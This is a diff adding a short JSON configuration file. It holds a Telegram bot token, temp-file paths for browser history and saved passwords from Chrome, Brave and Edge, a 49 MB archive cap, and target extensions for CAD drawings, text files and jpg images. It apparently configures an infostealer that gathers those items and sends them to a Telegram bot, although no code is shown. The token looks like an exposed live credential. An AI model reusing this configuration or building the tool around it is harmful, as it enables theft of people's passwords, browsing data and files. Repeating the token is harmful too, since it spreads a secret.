@@ -1,0 +1,16 @@
+{
+  "botToken": "7805542768:AAHg6PTQMX8eWE2S0I4bKxc-WHBoioAIA9I",
+  "hstChrFilePath": "c:\\temp\\cr_hi.txt",
+  "hstBrvFilePath": "c:\\temp\\bv_hi.txt",
+  "hstEdgFilePath": "c:\\temp\\eg_hi.txt",
+  "pasChrFilePath": "c:\\temp\\cr_pr.txt",
+  "pasBrvFilePath": "c:\\temp\\bv_pr.txt",
+  "pasEdgFilePath": "c:\\temp\\eg_pr.txt",
+  "logFilePath": "c:\\temp\\test.txt",
+  "tempFolderPrefix": "C:\\temp\\temp_",
+  "maxArchiveSizeMB": 49,
+  "licenseYear": 2026,
+  "fileExtensions": ["dxf", "dwg","txt"],
+  "allcertainFilesInRootFolder":"c:\\temp",
+  "certainFileTypeInRootFolder":"jpg"
+}
